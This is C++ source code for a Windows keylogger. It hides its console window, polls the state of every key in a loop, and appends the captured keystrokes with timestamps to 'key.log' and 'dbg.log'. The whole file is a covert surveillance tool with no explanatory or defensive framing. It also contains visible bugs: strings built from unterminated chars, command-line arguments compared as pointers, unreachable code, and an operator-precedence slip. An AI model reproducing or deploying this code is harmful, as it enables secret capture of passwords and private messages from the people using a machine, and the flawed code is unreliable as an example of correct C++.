# include <conio.h>
# include <windows.h>
# include <winuser.h>
# include <iostream>
# include <ctime>
# include <fstream>
# include <cstdlib>

//#define DEBUG

char txt_key;
FILE* txt_logger;
HWND form_stealth;

int sys_refresh = 10;

/*flags*/
bool x_capslock;
bool x_shift;
bool sys_exit;

struct tm* date_now;
struct tm* date_before;

int inputPick();
std::string inputCheck(char key);
std::string int2string(int charuse);
bool fileSave(char drop, char* path);
int sysArgs(int counter , char** args);

int main(int argc, char** argv)
{
#ifndef DEBUG
	AllocConsole();
	form_stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(form_stealth,0);
#endif
    time_t t = time(0);
    date_before = new tm;
    date_before->tm_sec = localtime( &t )->tm_sec;
    date_before->tm_min = localtime( &t )->tm_min;
    sysArgs(argc,argv);
	while(true)
	{
		txt_key = inputPick();
		if(txt_key != 0)
		{
			fileSave(txt_key, "key.log");
		}
	}
}

int inputPick()
{
	Sleep(sys_refresh);
	for(int i = 8; i <= 256; i++)
		if(GetAsyncKeyState(i) & 0x8000 != 0)
			return i;
	return 0;
}
bool fileSave(char drop, char* path)
{
    std::ofstream out(path, std::ios_base::app);
	std::ofstream logs("dbg.log", std::ios_base::app);
    time_t t = time(0);
    date_now = localtime( &t );
    if(date_before->tm_sec - date_now->tm_sec > 5 || date_before->tm_min != date_now->tm_min)
    {
        out << std::endl << "[DATE TIME = " << date_now->tm_mon + 1 << "/" << date_now->tm_mday << "-> "
            << date_now->tm_hour << ":" << date_now->tm_min << ":" << date_now->tm_sec << "]" << std::endl;
        logs << std::endl << "[DATE TIME = " << date_now->tm_mon + 1 << "/" << date_now->tm_mday << "-> "
            << date_now->tm_hour << ":" << date_now->tm_min << ":" << date_now->tm_sec << "]" << std::endl;
        date_before->tm_sec = date_now->tm_sec;
        date_before->tm_min = date_now->tm_min;
    }
	std::string text = inputCheck(drop);
#ifdef DEBUG
	std::cout << text;
#endif
    out << text;
    logs << (int)drop << " | ";
    out.close();
	return true;
}

std::string inputCheck(char key)
{
if (key == 8)
	return "[BACKSPACE]";
else if (key == 13)
	return "\n";
else if (key == 32)
	return " ";
else if (key == VK_TAB)
	return "[TAB]";
else if (key == VK_CONTROL)
	return "[CONTROL]";
else if (key == VK_END)
	return "[END]";
else if (key == VK_HOME || key == 91 || key == 92)
	return "[HOME]";
else if (key == VK_LEFT)
	return "[LEFT]";
else if (key == VK_UP)
	return "[UP]";
else if (key == VK_RIGHT)
	return "[RIGHT]";
else if (key == VK_DOWN)
	return "[DOWN]";
else if (key == -112)
	return "[BLOCKNUM]";
else if (key == 190 || key == 110)
	return ".";
else if (key == -35)
	return "i'";
else if (key == -64)
	return "o'";
else if (key == -34)
	return "a'";
else if (key == -65)
	return "u'";
else if (key == -70)
	return "e'";
else if (key == 107 || key == -69)
	return "+";
else if (key == 109)
	return "-";
else if (key == 106)
	return "*";
else if (key == 111)
	return "/";
else if (key == -37)
	return "'";
else if (key == -36)
	return "\\";
else if (key == -68)
    return ",";
else if (key == -66)
    return ",";
else if (key == -67)
    return "-";
else if (key == 46)
    return "[CANC]";
else if (key == 45)
    return "[INS]";
else if (key == 112)
    return "[F1]";
else if (key == 113)
    return "[F2]";
else if (key == 114)
    return "[F3]";
else if (key == 115)
    return "[F4]";
else if (key == 116)
    return "[F5]";
else if (key == 117)
    return "[F6]";
else if (key == 118)
    return "[F7]";
else if (key == 119)
    return "[F8]";
else if (key == 120)
    return "[F9]";
else if (key == 121)
    return "[F10]";
else if (key == 122)
    return "[F11]";
else if (key == 123)
    return "[F12]";
else if (key == 18)
    return "[ALT]";
else if (key == -30)
    return "<";
else if (key == VK_ESCAPE)
{
	return "[ESCAPE]";
	if(sys_exit)
        return 0;
}
else if (key == VK_SHIFT || key == -96)
{
	x_shift = true;
	return key == -96 ? "" : "[SHIFT]";
}
else if (key == VK_CAPITAL)
{
	x_capslock = !x_capslock;
	return "[CAPSLOCK]";
}
else
{
	if(!x_capslock && !x_shift)
		return int2string(tolower(key));
	if(x_shift && x_capslock)
    {
        x_shift = false;
		return int2string(tolower(key));
    }
	if(!x_shift && x_capslock)
		return int2string(key);
	if(x_shift && !x_capslock)
	{
		x_shift = false;
		return int2string(key);
	}
}
}

std::string int2string(int charuse)
{
    char use = charuse;
    return std::string(&use);
}

int sysArgs(int counter , char** args)
{
    for(int i = 0; i < counter; i++)
    {
        if(args[i] == "-exit")
            sys_exit = true;
        if(args[i] == "-refresh")
            sys_refresh = strtol(args[i+1],0,10);
    }
    return 0;
}
